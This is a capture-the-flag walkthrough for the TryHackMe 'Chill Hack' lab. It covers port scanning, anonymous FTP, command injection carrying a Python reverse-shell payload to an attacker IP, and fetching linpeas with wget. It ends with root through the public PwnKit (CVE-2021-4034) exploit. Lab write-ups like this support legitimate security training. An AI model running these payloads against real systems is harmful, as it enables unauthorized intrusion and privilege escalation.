## Chill Hack
https://tryhackme.com/room/chillhack

### 🍜Enum
```
./rustscan -a chill.thm
```
```
Open 10.10.100.185:21
Open 10.10.100.185:22
Open 10.10.100.185:80
```
```
nmap -p 21,22,80 -sC -sV -T4 -A chill.thm
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.95.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
```
ftp> open 10.10.100.185
Connected to 10.10.100.185.
220 (vsFTPd 3.0.3)
Name (10.10.100.185:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61202|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
```
```
cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
🚩User: Anurodh,Apaar
🤔Need some bypasses?

```
gobuster dir -u chill.thm -w Discovery/Web-Content/common.txt -t 50 -x html,shtml,php,jsp,log,bk,old -b 403,404
```
![image](https://user-images.githubusercontent.com/6504854/177584943-031bb322-51e5-4e02-9529-51fb1bbecf35.png)

![image](https://user-images.githubusercontent.com/6504854/177585421-e13b5ab5-d730-43f4-a5a9-c7080ec5cd5c.png)

![image](https://user-images.githubusercontent.com/6504854/177586924-e5c3eb48-2447-41d1-8e6f-d73851cd6f76.png)

![image](https://user-images.githubusercontent.com/6504854/177587825-8099310f-088e-4680-9a37-9cf36cdefed8.png)

🚩we can use restricted command.

### 🍜User
```
id;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';
```
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.100.185] 44778
$ whoami
whoami
www-data
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

```
$cd /tmp
$ cp /home/apaar/.helpline.sh help.sh
$ ls
help.sh
$ cat help.sh
```
```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

```
$cd /home/apaar/
$sudo -u apaar ./.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
test
Hello user! I am test,  Please enter your message: cat local.txt
cat local.txt
```

### 🍜Root
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
$ cd /tmp
$ wget http://10.10.10.10/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```
![image](https://user-images.githubusercontent.com/6504854/177595465-2c99449d-6e0d-4c40-be72-ee19f84dabe8.png)

https://github.com/berdav/CVE-2021-4034

```
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
cd ../
tar -cvf poc.tar CVE-2021-4034
python3 -m http.server 80
```

wget and extract tar, exec shell

![image](https://user-images.githubusercontent.com/6504854/177610520-a5d9ace1-43dd-428d-9d61-7a0d572e165e.png)

😄Thank for your all support. Happy hacking 🏖️
